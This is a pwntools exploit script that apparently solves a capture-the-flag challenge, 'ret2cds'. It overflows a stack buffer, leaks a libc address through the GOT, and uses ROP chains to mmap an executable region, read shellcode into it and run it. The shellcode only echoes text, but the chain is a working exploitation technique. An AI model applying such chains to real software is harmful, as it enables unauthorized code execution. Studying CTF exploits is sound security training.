#!/usr/bin/env python3

from pwn import *

the_binary = "./ret2cds"
context.binary = the_binary
elf = context.binary
libc = ELF("./libc.so.6", checksec=False)

context.terminal = ["tmux", "splitw", "-h"]

if args.REMOTE:
    io = remote(args.HOST, int(args.PORT))
elif args.STRACE:
    io = process(["strace", "-o", "trace.txt", the_binary])
else:
    io = process(the_binary)

if args.GDB:
    gdb.attach(io, f"""
        file {the_binary}
        break *0x4012b9
        ignore 1 1
        continue
    """)

class Const:
    rip_offset = 0x108

    mmap_base = 0xdead0000
    iovec_read = 0xdead1000
    iovec_write = 0xdead2000
    mmap_size = 0x3000

def libc_off(offset):
    return libc.address + offset

class Gadgets:
    elf_main = 0x40123a

    # 0x0000000000401016: ret;
    ret = 0x0000000000401016

    # 0x000000000040131b: pop rdi; ret;
    pop_rdi = 0x000000000040131b

    # 0x0000000000401319: pop rsi; pop r15; ret;
    pop_rsi_pop_r15 = 0x0000000000401319

    # 0x00000000001626d6: pop rdx; pop rbx; ret;
    @property
    def pop_rdx_pop_rbx(self):
        return libc_off(0x00000000001626d6)

    # 0x000000000004a550: pop rax; ret;
    @property
    def pop_rax(self):
        return libc_off(0x000000000004a550)

    # 0x00000000001536e9: pop rax; call rax;
    @property
    def pop_rax_call_rax(self):
        return libc_off(0x00000000001536e9)

    # 0x0000000000156108: mov r8, rax; mov rax, r8; pop rbx; ret;
    @property
    def mov_r8_rax_mov_rax_r8_pop_rbx(self):
        return libc_off(0x0000000000156108)

    # 0x000000000007d2f0: mov r9, rax; pop r12; pop r13; mov rax, r9; pop r14; ret;
    @property
    def mov_r9_rax_pop_r12_pop_r13_mov_rax_r9_pop_r14(self):
        return libc_off(0x000000000007d2f0)

    # 0x000000000007b0cb: mov r10, rdx; jmp rax;
    @property
    def mov_r10_rdx_jmp_rax(self):
        return libc_off(0x000000000007b0cb)

    # 0x0000000000066229: syscall; ret;
    @property
    def syscall(self):
        return libc_off(0x0000000000066229)

shellcode = "\n".join([
    shellcraft.echo("\n\nIt's working...\n\n\n"),
])
shellcode = asm(shellcode)

g = Gadgets()

def do_rop(*gadgets):
    chain = b""
    chain += b"A"*Const.rip_offset
    chain += flat(*gadgets)
    assert len(chain) <= 0x200
    io.sendafter("warden: ", chain)

# leak a libc address
do_rop(
    g.pop_rdi,
    constants.STDOUT_FILENO,
    g.pop_rsi_pop_r15,
    elf.got.read,
    0xdeadbeef,
    # rdx already equals 0x1d from the program's last write
    elf.plt.write,
    g.elf_main
)
io.recvuntil("escaping...\n")
leak = io.recvuntil("Welcome", drop=True)
libc_read = u64(leak[1:9])
libc.address = libc_read - libc.sym.read
log.info("read@libc: %#x" % libc_read)
log.info("libc base: %#x" % libc.address)

# map a rwx segment
do_rop(
    # rdi = addr
    g.pop_rdi,
    Const.mmap_base,
    # rsi = len
    g.pop_rsi_pop_r15,
    Const.mmap_size,
    0xdeadbeef,
    # r10 = flags
    g.pop_rax,
    g.ret,
    g.pop_rdx_pop_rbx,
    constants.MAP_PRIVATE | constants.MAP_FIXED | constants.MAP_ANON,
    0xdeadbeef,
    g.mov_r10_rdx_jmp_rax,
    # rdx = prot; do this after r10 since r10's gadget clobbers rdx
    g.pop_rdx_pop_rbx,
    constants.PROT_READ | constants.PROT_WRITE | constants.PROT_EXEC,
    0xdeadbeef,
    # r8 = fd
    g.pop_rax,
    0xffffffffffffffff,
    g.mov_r8_rax_mov_rax_r8_pop_rbx,
    0xdeadbeef,
    # r9 = off
    g.pop_rax,
    0,
    g.mov_r9_rax_pop_r12_pop_r13_mov_rax_r9_pop_r14,
    0xdeadbeef,
    0xdeadbeef,
    0xdeadbeef,
    # rax = SYS_mmap
    g.pop_rax,
    constants.SYS_mmap,
    g.syscall,
    # back to main one last time...
    g.elf_main
)

# read shellcode into the rwx segment and jump to it
do_rop(
    # rdi = fd
    g.pop_rdi,
    constants.STDIN_FILENO,
    # rsi = buf
    g.pop_rsi_pop_r15,
    Const.mmap_base,
    0xdeadbeef,
    # rdx = len
    g.pop_rdx_pop_rbx,
    len(shellcode),
    0xdeadbeef,
    # rax = SYS_read
    g.pop_rax,
    constants.SYS_read,
    g.syscall,
    # jump to shellcode
    g.pop_rax_call_rax,
    Const.mmap_base
)

sleep(2)
io.send(shellcode)
io.interactive()
